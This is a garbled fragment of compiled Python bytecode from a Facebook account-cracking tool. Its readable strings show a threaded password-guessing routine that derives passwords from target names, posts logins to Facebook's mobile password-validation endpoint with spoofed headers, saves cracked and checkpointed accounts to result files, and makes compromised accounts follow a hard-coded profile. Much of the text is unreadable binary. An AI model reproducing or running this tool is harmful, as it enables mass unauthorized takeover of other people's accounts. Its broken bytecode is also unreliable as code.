 r<   ra   r`   zresults/TAB-YES.txtr�   r�   r5   )rC   r%  r	  r�   rD   r   r�   r�   r�   r>   rA   r�   r&  r'  r9   r+   rE   r�   r*   r(  )r.  r/  r2  r�   r�   ZdatZdat2Zbutr�   ZubahPwZresUbahZlink3Zbut2r�   r3  r0  r1   r1   r2   r*  o  s,   

�

�N*�r*  c              	   C   sF  | j dd|id�j}t|d�}|jddd�}dd	� |�d

�D �}t|�dkr5tdt� d

t� dt� d�� nt	t|��D ]}tdt

|d || �dd�tf � q;| j dd|id�j}t|d�}|jddd�}dd	� |�d

�D �}t|�dkr�tdt� d

t� dt� d�� d S t	t|��D ]}tdt|d || �dd�tf � q�d S )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer�   r�   r�   r  r	  )r  c                 S   r   r1   r!  �r  �ir1   r1   r2   r  �  r#  zcek_apk.<locals>.<listcomp>r�   r   r�   r    rT   z1] OPSHH THERE ARE NO ACTIVE APPS ON THIS ACCOUNT.z

   %s%s. %s%sr   zDitambahkan padaz Ditambahkan padaz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   r   r1   r!  r4  r1   r1   r2   r  �  r#  z8] OPSHH THERE IS NO EXPIRED APPLICATION IN THIS ACCOUNT.ZKedaluwarsaz Kedaluwarsa)

rC   rD   r   r�   r�   ri   r9   r+   rl   r�   rE   rq   rj   )r.  r�   r�   Zsopr�   Zgamer5  r1   r1   r2   r(  �  s"   

&

 &�r(  c                   @   s4   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d

� ZdS )r�   c                 C   s

   g | _ d S �N)rJ   )�selfr1   r1   r2   �__init__�  s   

z__crack__.__init__c                    s4  |�_ tdtttt�j �tf � tdttf �}|dv rttdtttf � 	 tdttf �}tdt|tf � |dkrFtd	tttf � n-t|�d

krVtdtttf � nd� �fdd

�	� td� tdttf � � |�d�� d S q'|dv r�td� tdttf � ���  d S tdtttf � ��	|� d S )Nz

 [%s+%s] TOTAL ID -> %s%s%sz4 [%s?%s] DO YOU WANT TO USE MANUAL PASSWORD? [Y/t]: rU   z|

 %s[%s!%s] USE , (comma) FOR EXAMPLE SEPARATE : PASSWORD123, PASSWORD12345, ETC. EACH WORD IS AT LEAST 6 CHARACTERS OR MORETz

 [%s?%s] ENTER PASSWORD : z& [*] CRACK WITH PASSWORD -> [ %s%s%s ]rS   u*   

 %s[%s×%s] DONT LEAVE THE PASSWORD EMPTYrY   r_   c              	      sz  t � }td�}|dkrtdtttf � � �  d S |dkrutdtttttf � tdtttttf � tdttf � t	dd	��&}�j

D ]}z|�d

�d }|��j

|| d|� W qD   Y qDW d   � n1 siw   Y  ttt� d S |d

kr�tdtttttf � tdtttttf � tdttf � t	dd	��&}�j

D ]}z|�d

�d }|��j

|| d|� W q�   Y q�W d   � n1 s�w   Y  ttt� d S |dk�r/tdtttttf � tdtttttf � tdttf � t	dd	��&}�j

D ]}z|�d

�d }|��j

|| d|� W q�   Y q�W d   � n	1 �s#w   Y  ttt� d S tdtttf � � �  d S )N�

 [*] METHOD : rS   �!   

 %s[%s×%s] DONT LEAVE EMPTY BROr~   zH

 [%s+%s] KACHI-OK RESULTS ARE SAVED TO -> RESULTS/KACHI-OK-%s-%s-%s.txtzG [%s+%s] KACHI-CP RESULTS ARE SAVED TO -> RESULTS/KACHI-CP-%s-%s-%s.txt�D

 [%s!%s] YOU CAN TURN OFF CELLULAR DATA TO PAUSE THE CRACK PROCESS

�   �Zmax_workersr�   r   �m.facebook.comr�   r  r�   r�   )rP   rk   r9   r+   rl   r,   r+  r,  r-  �YayanGantengrJ   rr   �submit�

__metode__rm   rv   rw   )Zysc�uaAPIZcinZ__yayanXD__ZikehZkimochi��__yan__r7  r1   r2   rD  �  sX   



��



��





��z __crack__.plerr.<locals>.__yan__z0

 [ CHOOSE THE LOGIN METHOD - PLEASE TRY ONE  ]

z. [%s3%s]. METHOD MOBILE [[92mRECOMMENDED[0m]�,re   z+

 [ CHOOSE LOGIN METHOD - PLEASE TRY ONE ]

z. [%s3%s]. MOBILE METHOD [[92mRECOMMENDED[0m]u   

 %s[%s×%s] Y/T!r6  )

rJ   r9   r,   r+   rl   ri   rk   rr   �__pler__r�   )r7  rJ   Z___yayanganteng___Zpwekr1   rC  r2   r�   �  s.   +�9 z__crack__.plerrc                 C   s�  t d�D ])}tj�dt� |� t� dt� dt| j�� dtt	�� dtt

�� d�

�f tj��  q�zE|D �]:}|�� }t

�� }dd	d

dd	dd

ddddddd�

}|jd|d�}t�dt|j���d�t�dt|j���d�|d|dd�}	ddd	ddd ddd!ddddd"dd#�}

|jd$|� d%�|	|

d&d'�}d(|j�� v r�d)�d*d+� |j�� �� D ��}td,t� d-|� d.|� d.|� t� �	� d/|||f }

t	�|

� td0ttt f d1��d2|

 � | �!||�  n�d3|j�� v �rmzNtd4��"� }|�d5|� d6|� ���#� d7 }|�$d�\}}}t%| }td8t&|||||tf � d9|||||f }

t

�|

� td:ttt f d1��d2|

 � W  n< t't(f�yC   d;}d;}d;}Y n   Y td<t&||tf � d=||f }

t

�|

� td:ttt f d1��d2|

 �  nq2td7 aW d S    Y d S )>Nz\|-/z

 [u   ] [HACKING-IDS 👨‍💻] r�   z -> Kachi-OK-:z

 - Kachi-CP-:ra   r>  r~   z�'Mozilla/5.0 (Linux; Android 11; Asus Zenfone Max Pro M2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4681.3 Mobile Safari/537.36r  zmark.via.gpZnoneZnavigatez?1Zdocumentz https://developers.facebook.com/r  z5en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5)

r  r�   r   r�   Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destr�   r  r�   zlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)r�   zname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)Zlsdr  �uidZflowr  �nextr   zhttps://m.facebook.comz!application/x-www-form-urlencodedrL   zsame-originzgzip, deflate, br)r  r�   r�   r�   r�   r   r�   rG  rH  rI  rJ  rK  r�   r  r�   zhttps://z-/login/device-based/validate-password/?shbl=0F)r�   r�   Zallow_redirectsr  r  c                 S   s   g | ]

\}}|d  | �qS )r�   r1   r  r1   r1   r2   r    r  z(__crack__.__metode__.<locals>.<listcomp>r  z[Kachi-OK] r  u    [✓] %s | %s | %szresults/Kachi-OK-%s-%s-%s.txtr�   z%s

r  r�   r�   z?fields=birthday&access_token=Zbirthdayz)

  %s[Kachi-CP] %s | %s | %s %s %s     %su    [×] %s | %s | %s %s %szresults/Kachi-CP-%s-%s-%s.txtrS   z)

  %s[Kachi-CP] %s | %s                %su

    [×] %s | %s))�listr(   r)   r*   r,   r+   �loopri   rJ   rv   rw   r-   �lowerrB   r�   rC   r�   r�   r>   rD   r�   r	  r�   r&  rA   r'  r9   rE   ro   r�   r+  r,  r-  �followr�   r�   rr   �	bulan_ttlrj   r�   r�   )r7  r�   �pwxZcebokr5  Zpwr.  �headerr�   ZdasZheader1Zpor0  Zwrtr�   Zcp_ttl�month�day�yearr1   r1   r2   rA  �  s�   D

��	�$





z__crack__.__metode__c                 C   sN   t |jdd|id�jd�}|jddd��d�}|jd	t|� d|id�j d S )

Nz:https://mbasic.facebook.com/profile.php?id=100061968543976r�   r�   r�   r�   ZIkutir�   r�   r   )r   rC   rD   r�   r>   )r7  r.  r0  r�   rC   r1   r1   r2   rQ  <  s    z__crack__.followc           	   	   C   s8  t � }td�}|dkrtdtttf � | ��  d S |dv r�tdttttt	f � tdttttt	f � tdttf � t

dd	��l}| jD ]`}zY|�d

�\}}|�d�}t

|�dkslt

|�d

kslt

|�dkslt

|�dkr�||d d |d |d  |d d g}n||d d |d |d  |d d g}|�| j||d|� W qE   Y qEW d   � n1 s�w   Y  ttt� d S |dv �rdtdttttt	f � tdttttt	f � tdttf � t

dd	��p}| jD ]d}z]|�d

�\}}|�d�}t

|�dk�st

|�d

k�st

|�dk�st

|�dk�r(||d d |d |d  |d d g}n||d d |d |d  |d d g}|�| j||d|� W q�   Y q�W d   � n	1 �sXw   Y  ttt� d S |dv �r

tdttttt	f � tdttttt	f � tdttf � t

dd	��q}| jD ]e}z]|�d

�\}}|�d�}t

|�dk�s�t

|�d

k�s�t

|�dk�s�t

|�dk�r�||d d |d |d  |d d g}n||d d |d |d  |d d g}|�| j||d� W �q�   Y �q�W d   � n	1 �sw   Y  ttt� d S tdtttf � | ��  d S )Nr9  rS   r:  r�   zE

 [%s+%KACHI-OK RESULTS ARE SAVED TO -> RESULTS/KACHI-OK-%s-%s-%s.txtzD [%s+%KACHI-CP RESULTS ARE SAVED TO -> RESULTS/KACHI-CP-%s-%s-%s.txtr;  r<  r=  r�   ra   r}   �   rY   �   r   Z123r   Z12345r>  r�   zH

 [%s+%s] Kachi-OK RESULTS ARE SAVED TO -> RESULTS/KACHI-OK-%s-%s-%s.txtzG [%s+%s] Kachi-CP RESULTS ARE SAVED TO -> RESULTS/KACHI-CP-%s-%s-%s.txtr  r�   r�   )rP   rk   r9   r+   rl   rF  r,   r+  r,  r-  r?  rJ   rr   ri   r@  rA  rm   rv   rw   )	r7  rB  ZyanZkirimZyntktsrL  rH   r�   rS  r1   r1   r2   rF  A  sv   



0*(��





8*(��





8*(��

z__crack__.__pler__N)�__name__�

__module__�__qualname__r8  r�   rA  rQ  rF  r1   r1   r1   r2   r�   �  s    HVr�   r=   )Yr#   rB   �ImportErrorr9   r$   Zconcurrent.futuresZ

concurrentr�   r�   r(   r�   r.   rM   r   �

subprocessZ	threadingr%   r   r?  r   ZnowZctrU  �nZbulanrG   ZnTemp�

ValueErrorZcurrentrW  r-  ZburV  r+  r,  rF   rl   rE   rj   r�   �Ur,   r+   Zmy_colorrN   Zwarnar�   r)  Zamanrw   Zsalahrn   rp   rv   rJ   r�   rO  Z

url_lookupr�   r�   r�   rR  r'   r3   ZThreadrg   �startr/   r8   r:   rI   rP   rm   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rs   r*  r(  r�   rZ  r1   r1   r1   r2   �<module>   s�    ���`

��









'' &$@ 

h

�
